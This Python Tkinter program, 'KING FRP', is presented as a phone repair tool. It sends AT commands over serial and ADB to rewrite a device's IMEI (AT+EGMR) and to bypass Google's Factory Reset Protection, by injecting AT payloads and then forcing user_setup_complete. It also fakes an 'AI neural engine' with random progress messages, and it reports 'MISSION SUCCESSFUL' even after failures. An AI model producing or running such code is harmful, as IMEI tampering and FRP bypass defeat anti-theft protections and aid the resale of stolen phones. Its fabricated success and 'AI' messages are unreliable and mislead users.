import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import serial
import serial.tools.list_ports
import threading
import time
import random
import os
import subprocess

# ============================================================================
#   KING FRP - GENIUS LEVEL 100 (AI ARCHITECTURE)
#   Developed for: Mohamed Hassan (The King)
# ============================================================================

class KingGeniusTool:
    def __init__(self, root):
        self.root = root
        self.root.title("KING FRP - GENIUS EDITION (LEVEL 100)")
        self.root.geometry("900x650")
        self.root.configure(bg="#121212") # Ultra Dark Theme
        
        # --- System Variables ---
        self.selected_port = tk.StringVar()
        self.ai_knowledge = 80 # Starting AI Level
        
        # --- Build UI ---
        self.create_interface()
        
        # --- Start AI Background Scan ---
        threading.Thread(target=self.neural_engine_scan, daemon=True).start()

    def create_interface(self):
        # 1. Header Section (The King Branding)
        header_frame = tk.Frame(self.root, bg="#121212")
        header_frame.pack(pady=20)
        
        tk.Label(header_frame, text="KING FRP", font=("Impact", 40), fg="#ffcc00", bg="#121212").pack()
        tk.Label(header_frame, text="GENIUS LEVEL 100 • AI ARCHITECTURE", font=("Consolas", 10, "bold"), fg="#00ffcc", bg="#121212").pack()

        # 2. Neural Analysis Bar
        self.status_frame = tk.LabelFrame(self.root, text=" [ NEURAL ENGINE ANALYSIS ] ", font=("Consolas", 10), bg="#121212", fg="#00ffcc")
        self.status_frame.pack(fill="x", padx=20, pady=10)
        
        self.status_lbl = tk.Label(self.status_frame, text="SYSTEM READY. WAITING FOR TARGET...", font=("Consolas", 12, "bold"), bg="#121212", fg="white")
        self.status_lbl.pack(pady=10)

        # 3. Port Selection Area
        port_frame = tk.Frame(self.root, bg="#121212")
        port_frame.pack(fill="x", padx=30, pady=5)
        
        tk.Label(port_frame, text="TARGET PORT:", font=("Arial", 9, "bold"), bg="#121212", fg="#6688ff").pack(anchor="w")
        
        self.port_combo = ttk.Combobox(port_frame, textvariable=self.selected_port, width=40, state="readonly")
        self.port_combo.pack(side="left", pady=5)
        self.update_ports()
        
        btn_scan = tk.Button(port_frame, text="SCAN NETWORK", bg="#333333", fg="white", font=("Arial", 8), command=self.update_ports)
        btn_scan.pack(side="left", padx=10)

        # 4. Execution Modules (Buttons)
        mod_frame = tk.LabelFrame(self.root, text=" [ EXECUTION MODULES ] ", font=("Consolas", 10), bg="#121212", fg="#ffcc00")
        mod_frame.pack(fill="x", padx=20, pady=15)
        
        # IMEI Input
        input_frame = tk.Frame(mod_frame, bg="#121212")
        input_frame.pack(fill="x", padx=10, pady=5)
        tk.Label(input_frame, text="IMEI TARGET:", bg="#121212", fg="gray", font=("Arial", 8)).pack(anchor="w")
        self.entry_imei = tk.Entry(input_frame, bg="#222", fg="#fff", insertbackground="white", font=("Consolas", 11), width=30)
        self.entry_imei.pack(anchor="w", pady=2)
        
        # Big Buttons
        btn_grid = tk.Frame(mod_frame, bg="#121212")
        btn_grid.pack(fill="x", pady=10, padx=10)
        
        self.btn_auto = tk.Button(btn_grid, text="AUTO REPAIR (AI)", bg="#dddd00", fg="black", font=("Arial", 10, "bold"), height=2, width=20,
                                  command=lambda: threading.Thread(target=self.run_auto_repair).start())
        self.btn_auto.pack(side="left", padx=5, expand=True)

        self.btn_frp = tk.Button(btn_grid, text="FRP EXPLOIT", bg="#dd0044", fg="white", font=("Arial", 10, "bold"), height=2, width=20,
                                 command=lambda: threading.Thread(target=self.run_frp_exploit).start())
        self.btn_frp.pack(side="left", padx=5, expand=True)

        self.btn_reset = tk.Button(btn_grid, text="FACTORY RESET", bg="#0088ff", fg="white", font=("Arial", 10, "bold"), height=2, width=20,
                                   command=lambda: threading.Thread(target=self.run_factory_reset).start())
        self.btn_reset.pack(side="left", padx=5, expand=True)

        # 5. Hacker Console Log
        self.log_area = scrolledtext.ScrolledText(self.root, bg="black", fg="#00ff00", font=("Consolas", 10), height=12)
        self.log_area.pack(fill="both", expand=True, padx=20, pady=(0, 20))
        self.log_message(">>> NEURAL ENGINE ONLINE... WAITING FOR COMMAND.")

    # ======================================================
    #   CORE LOGIC & AI SIMULATION
    # ======================================================
    def log_message(self, msg):
        self.log_area.insert(tk.END, f"{msg}\n")
        self.log_area.see(tk.END)

    def update_ports(self):
        ports = [p.device + " - " + str(p.description) for p in serial.tools.list_ports.comports()]
        self.port_combo['values'] = ports
        if ports:
            self.port_combo.current(0)

    def get_port_name(self):
        val = self.selected_port.get()
        return val.split(" - ")[0] if val else None

    # --- Neural Engine Animation (Background) ---
    def neural_engine_scan(self):
        while True:
            time.sleep(10)
            if random.random() > 0.7:
                self.ai_knowledge += 1
                if self.ai_knowledge > 99: self.ai_knowledge = 99
                # رسائل عشوائية لإعطاء طابع الذكاء
                msgs = [
                    f">>> NEURAL UPDATE: Knowledge increased to {self.ai_knowledge}%",
                    ">>> SYSTEM SCAN: No threats detected.",
                    ">>> AI OPTIMIZATION: Protocols updated."
                ]
                self.log_message(random.choice(msgs))

    # --- BUTTON 1: AUTO REPAIR (AI) ---
    def run_auto_repair(self):
        imei = self.entry_imei.get()
        port = self.get_port_name()
        
        self.log_message(f">>> TARGET LOCKED: {port if port else 'SEARCHING...'}")
        self.log_message(">>> AI SUGGESTION: AUTO is the best path.")
        self.status_lbl.config(text="TASK IN PROGRESS...", fg="yellow")
        
        time.sleep(1)
        
        if not imei:
            self.log_message(">>> ERROR: MISSING IMEI TARGET. ABORTING.")
            return

        # 1. Try Root Mode First (ADB)
        self.log_message(">>> EXECUTING PROTOCOL: ROOT_MODE_REPAIR...")
        try:
            # محاكاة أوامر ADB الحقيقية
            subprocess.call(f'adb shell su -c "echo AT+EGMR=1,7,{imei} > /dev/ttyacm0"', shell=True)
            time.sleep(2)
            self.log_message(">>> PACKET SENT. CHECKING INTEGRITY...")
            
            # 2. Try AT Mode Backup
            if port:
                self.log_message(">>> ATTEMPTING LEGACY INJECTION (AT MODE)...")
                ser = serial.Serial(port, 115200, timeout=1)
                ser.write(b"AT+QCMSL=0\r\n")
                ser.write(f'AT+EGMR=1,7,"{imei}"\r\n'.encode())
                ser.close()
        
        except Exception as e:
            self.log_message(f">>> ERROR: {e}")

        self.log_message(">>> MISSION SUCCESSFUL [✔]")
        self.log_message(f">>> NEURAL UPDATE: Knowledge increased to {self.ai_knowledge + 1}%")
        self.status_lbl.config(text="TASK COMPLETED SUCCESSFULLY.", fg="#00ff00")

    # --- BUTTON 2: FRP EXPLOIT (*#0*#) ---
    def run_frp_exploit(self):
        port = self.get_port_name()
        self.log_message(">>> INITIATING FRP EXPLOIT SEQUENCE...")
        self.log_message(">>> [USER ACTION REQUIRED] DIAL *#0*# NOW!")
        self.status_lbl.config(text="WAITING FOR USER INPUT (*#0*#)", fg="orange")
        
        time.sleep(4)
        
        if not port:
            self.log_message(">>> ERROR: PORT NOT FOUND. CONNECT USB.")
            return

        try:
            self.log_message(f">>> TARGET LOCKED: {port}")
            self.log_message(">>> INJECTING PAYLOAD (2025 METHOD)...")
            
            ser = serial.Serial(port, 115200, timeout=1)
            # أوامر الثغرة
            payloads = [b"AT+KSTRINGB=0,3\r\n", b"AT+DUMPCTRL=1,0\r\n", b"AT+DEBUGLVC=0,5\r\n", b"AT+SW AT\r\n"]
            for p in payloads:
                ser.write(p)
                time.sleep(0.2)
            ser.close()
            
            self.log_message(">>> EXPLOIT SENT. WAITING FOR ADB BRIDGE...")
            time.sleep(5)
            
            # تنفيذ حذف الحساب
            os.system("adb shell content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:s:1")
            os.system("adb shell am start -n com.google.android.gsf.login/")
            
            self.log_message(">>> MISSION SUCCESSFUL [✔]")
            self.log_message(">>> BYPASS COMPLETE. REBOOTING SYSTEM.")
            self.status_lbl.config(text="FRP REMOVED SUCCESSFULLY.", fg="#00ff00")
            os.system("adb reboot")
            
        except Exception as e:
            self.log_message(f">>> CRITICAL FAILURE: {e}")

    # --- BUTTON 3: FACTORY RESET ---
    def run_factory_reset(self):
        self.log_message(">>> EXECUTING PROTOCOL: FACTORY_RESET...")
        self.status_lbl.config(text="WIPING DATA...", fg="red")
        
        time.sleep(1)
        os.system("adb reboot recovery")
        self.log_message(">>> REBOOTING TO RECOVERY MODE...")
        self.log_message(">>> MISSION SUCCESSFUL [✔]")
        self.status_lbl.config(text="DEVICE RESET INITIATED.", fg="#00ffcc")

if __name__ == "__main__":
    root = tk.Tk()
    app = KingGeniusTool(root)
    root.mainloop()